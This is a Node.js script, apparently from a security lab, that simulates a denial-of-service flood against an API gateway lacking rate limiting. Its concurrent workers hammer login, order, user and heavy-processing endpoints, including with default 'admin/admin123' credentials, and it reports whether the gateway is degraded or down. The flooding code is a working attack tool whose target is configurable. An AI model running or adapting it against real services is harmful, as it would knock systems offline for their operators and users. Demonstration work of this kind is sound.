/**
 * DoS Attack Simulation Script
 * 
 * This script demonstrates how a hub component (API Gateway) 
 * can be overwhelmed without rate limiting protection.
 * 
 * Usage: node dos-attack.js [concurrency] [duration_seconds]
 */

const axios = require('axios');

const GATEWAY_URL = process.env.GATEWAY_URL || 'http://localhost:3000';
const CONCURRENCY = parseInt(process.argv[2]) || 100;
const DURATION_SECONDS = parseInt(process.argv[3]) || 30;

let stats = {
    sent: 0,
    success: 0,
    failed: 0,
    timeouts: 0,
    avgResponseTime: 0,
    minResponseTime: Infinity,
    maxResponseTime: 0
};

let running = true;

async function sendRequest() {
    const startTime = Date.now();
    const endpoints = [
        { method: 'post', url: '/api/auth/login', data: { username: 'admin', password: 'admin123' } },
        { method: 'post', url: '/api/orders', data: { product: 'Test Product', quantity: 1 } },
        { method: 'get', url: '/api/users' },
        { method: 'post', url: '/api/process-heavy', data: { iterations: 100000 } }
    ];

    const endpoint = endpoints[Math.floor(Math.random() * endpoints.length)];

    try {
        stats.sent++;

        const response = await axios({
            method: endpoint.method,
            url: `${GATEWAY_URL}${endpoint.url}`,
            data: endpoint.data,
            timeout: 30000  // 30 second timeout
        });

        const elapsed = Date.now() - startTime;
        stats.success++;

        // Update response time stats
        stats.avgResponseTime = (stats.avgResponseTime * (stats.success - 1) + elapsed) / stats.success;
        stats.minResponseTime = Math.min(stats.minResponseTime, elapsed);
        stats.maxResponseTime = Math.max(stats.maxResponseTime, elapsed);

        return { success: true, elapsed };
    } catch (error) {
        const elapsed = Date.now() - startTime;

        if (error.code === 'ECONNABORTED' || error.code === 'ETIMEDOUT') {
            stats.timeouts++;
        }
        stats.failed++;

        return { success: false, elapsed, error: error.message };
    }
}

async function worker() {
    while (running) {
        await sendRequest();
        // Small delay to prevent complete CPU saturation
        await new Promise(r => setTimeout(r, 10));
    }
}

async function printStats() {
    console.clear();
    console.log('╔════════════════════════════════════════════════════════════════════════╗');
    console.log('║                    DoS ATTACK SIMULATION                               ║');
    console.log('╠════════════════════════════════════════════════════════════════════════╣');
    console.log(`║  Target: ${GATEWAY_URL.padEnd(56)}  ║`);
    console.log(`║  Concurrent Workers: ${CONCURRENCY.toString().padEnd(47)}  ║`);
    console.log('╠════════════════════════════════════════════════════════════════════════╣');
    console.log('║  REQUEST STATISTICS:                                                   ║');
    console.log(`║    Total Sent:     ${stats.sent.toString().padEnd(49)}  ║`);
    console.log(`║    Successful:     ${stats.success.toString().padEnd(49)}  ║`);
    console.log(`║    Failed:         ${stats.failed.toString().padEnd(49)}  ║`);
    console.log(`║    Timeouts:       ${stats.timeouts.toString().padEnd(49)}  ║`);
    console.log('╠════════════════════════════════════════════════════════════════════════╣');
    console.log('║  RESPONSE TIME:                                                        ║');
    console.log(`║    Average:        ${Math.round(stats.avgResponseTime).toString().padEnd(45)} ms  ║`);
    console.log(`║    Min:            ${(stats.minResponseTime === Infinity ? 'N/A' : stats.minResponseTime + ' ms').padEnd(49)}  ║`);
    console.log(`║    Max:            ${(stats.maxResponseTime + ' ms').padEnd(49)}  ║`);
    console.log('╠════════════════════════════════════════════════════════════════════════╣');

    // Status indicator
    const successRate = stats.sent > 0 ? (stats.success / stats.sent * 100).toFixed(1) : 0;
    let status = 'GATEWAY HEALTHY';
    let statusColor = '\x1b[32m';

    if (successRate < 50) {
        status = 'GATEWAY DOWN / OVERWHELMED';
        statusColor = '\x1b[31m';
    } else if (successRate < 80 || stats.avgResponseTime > 1000) {
        status = 'GATEWAY DEGRADED';
        statusColor = '\x1b[33m';
    }

    console.log(`║  ${statusColor}STATUS: ${status}\x1b[0m`.padEnd(82) + '║');
    console.log(`║  Success Rate: ${successRate}%`.padEnd(73) + '║');
    console.log('╚════════════════════════════════════════════════════════════════════════╝');
    console.log('\n  Press Ctrl+C to stop the attack simulation');
}

async function checkGatewayMetrics() {
    try {
        const response = await axios.get(`${GATEWAY_URL}/metrics`, { timeout: 5000 });
        const metrics = response.data;

        console.log('\n╔════════════════════════════════════════════════════════════════════════╗');
        console.log('║                    GATEWAY METRICS (Victim)                            ║');
        console.log('╠════════════════════════════════════════════════════════════════════════╣');
        console.log(`║  Active Connections:   ${metrics.activeConnections.toString().padEnd(46)}  ║`);
        console.log(`║  Peak Connections:     ${metrics.peakConnections.toString().padEnd(46)}  ║`);
        console.log(`║  RabbitMQ Connections: ${metrics.rabbitConnections.toString().padEnd(46)}  ║`);
        console.log(`║  Memory Usage:         ${metrics.memoryUsageMB.toString().padEnd(43)} MB  ║`);
        console.log(`║  Failed Requests:      ${metrics.failedRequests.toString().padEnd(46)}  ║`);
        console.log('╚════════════════════════════════════════════════════════════════════════╝');
    } catch (error) {
        console.log('\n  [!] Cannot reach gateway - it may be overwhelmed!');
    }
}

async function main() {
    console.log('Starting DoS Attack Simulation...');
    console.log(`Concurrency: ${CONCURRENCY} workers`);
    console.log(`Duration: ${DURATION_SECONDS} seconds\n`);

    // Start workers
    const workers = [];
    for (let i = 0; i < CONCURRENCY; i++) {
        workers.push(worker());
    }

    // Update stats display periodically
    const statsInterval = setInterval(async () => {
        await printStats();
        await checkGatewayMetrics();
    }, 2000);

    // Stop after duration
    setTimeout(() => {
        running = false;
        clearInterval(statsInterval);

        setTimeout(async () => {
            console.log('\n\n═══════════════════════════════════════════════════════════════════════════');
            console.log('                        ATTACK SIMULATION COMPLETE                          ');
            console.log('═══════════════════════════════════════════════════════════════════════════');
            console.log('\nFinal Statistics:');
            console.log(`  Total Requests: ${stats.sent}`);
            console.log(`  Successful: ${stats.success} (${(stats.success / stats.sent * 100).toFixed(1)}%)`);
            console.log(`  Failed: ${stats.failed} (${(stats.failed / stats.sent * 100).toFixed(1)}%)`);
            console.log(`  Timeouts: ${stats.timeouts}`);
            console.log(`  Average Response Time: ${Math.round(stats.avgResponseTime)}ms`);
            console.log(`  Max Response Time: ${stats.maxResponseTime}ms`);

            await checkGatewayMetrics();

            console.log('\n\nVULNERABILITY DEMONSTRATED:');
            console.log('   The API Gateway (Hub) has no rate limiting, allowing:');
            console.log('   - Resource exhaustion attacks');
            console.log('   - Connection pool depletion');
            console.log('   - Memory growth from unclosed connections');
            console.log('   - Cascading failures to downstream services');

            process.exit(0);
        }, 1000);
    }, DURATION_SECONDS * 1000);
}

main().catch(console.error);
